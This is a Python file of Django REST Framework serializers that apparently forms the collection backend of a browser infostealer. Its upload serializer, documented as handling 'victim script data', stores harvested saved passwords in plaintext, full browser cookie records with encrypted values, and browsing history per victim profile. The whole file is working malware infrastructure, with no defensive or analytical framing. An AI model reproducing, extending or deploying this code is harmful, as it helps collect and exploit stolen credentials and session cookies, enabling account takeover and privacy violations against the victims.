from rest_framework import serializers
from .models import BrowserProfile, Password, Cookie, HistoryEntry

class PasswordSerializer(serializers.ModelSerializer):
    class Meta:
        model = Password
        fields = ['url', 'username', 'password']

class CookieSerializer(serializers.ModelSerializer):
    class Meta:
        model = Cookie
        fields = [
            'creation_utc', 'host_key', 'top_frame_site_key', 'name', 'value',
            'encrypted_value', 'path', 'expires_utc', 'is_secure', 'is_httponly',
            'last_access_utc', 'has_expires', 'is_persistent', 'priority',
            'samesite', 'source_scheme', 'source_port', 'is_same_party',
            'last_update_utc', 'is_edgelegacycookie', 'browser_provenance'
        ]

class HistoryEntrySerializer(serializers.ModelSerializer):
    class Meta:
        model = HistoryEntry
        fields = ['url', 'title', 'visit_count', 'last_visit_time']

class BrowserProfileSerializer(serializers.ModelSerializer):
    passwords = PasswordSerializer(many=True, read_only=True)
    cookies = CookieSerializer(many=True, read_only=True)
    history = HistoryEntrySerializer(many=True, read_only=True)

    class Meta:
        model = BrowserProfile
        fields = ['id', 'name', 'browser_type', 'profile_pic', 'passwords', 'cookies', 'history']

class DataUploadSerializer(serializers.Serializer):
    """Serializer for uploading victim script data"""
    profiles = serializers.ListField(
        child=serializers.DictField(),
        help_text="List of browser profiles with their data"
    )

    def create(self, validated_data):
        """Process uploaded data and save to database"""
        profiles_data = validated_data['profiles']
        created_profiles = []
        
        for profile_data in profiles_data:
            profile, created = BrowserProfile.objects.get_or_create(
                name=profile_data['name'],
                defaults={
                    'browser_type': profile_data.get('browser_type', 'Chrome')
                }
            )
            
            for pwd_data in profile_data.get('passwords', []):
                Password.objects.get_or_create(
                    browser_profile=profile,
                    url=pwd_data['url'],
                    username=pwd_data['username'],
                    defaults={'password': pwd_data['password']}
                )
            
            for cookie_data in profile_data.get('cookies', []):
                Cookie.objects.get_or_create(
                    browser_profile=profile,
                    host_key=cookie_data.get('host_key', ''),
                    name=cookie_data.get('name', ''),
                    defaults={
                        'creation_utc': cookie_data.get('creation_utc', 0),
                        'top_frame_site_key': cookie_data.get('top_frame_site_key', ''),
                        'value': cookie_data.get('value', ''),
                        'encrypted_value': cookie_data.get('encrypted_value', ''),
                        'path': cookie_data.get('path', ''),
                        'expires_utc': cookie_data.get('expires_utc', 0),
                        'is_secure': cookie_data.get('is_secure', False),
                        'is_httponly': cookie_data.get('is_httponly', False),
                        'last_access_utc': cookie_data.get('last_access_utc', 0),
                        'has_expires': cookie_data.get('has_expires', False),
                        'is_persistent': cookie_data.get('is_persistent', False),
                        'priority': cookie_data.get('priority', 0),
                        'samesite': cookie_data.get('samesite', 0),
                        'source_scheme': cookie_data.get('source_scheme', 0),
                        'source_port': cookie_data.get('source_port', 0),
                        'is_same_party': cookie_data.get('is_same_party', False),
                        'last_update_utc': cookie_data.get('last_update_utc', 0),
                        'is_edgelegacycookie': cookie_data.get('is_edgelegacycookie', False),
                        'browser_provenance': cookie_data.get('browser_provenance', 0),
                    }
                )
            
            for history_data in profile_data.get('history', []):
                HistoryEntry.objects.get_or_create(
                    browser_profile=profile,
                    url=history_data['url'],
                    defaults={
                        'title': history_data.get('title', ''),
                        'visit_count': history_data.get('visit_count', 1),
                        'last_visit_time': history_data.get('last_visit_time', 0),
                    }
                )
            
            created_profiles.append(profile)
        
        return {'profiles': created_profiles, 'count': len(created_profiles)}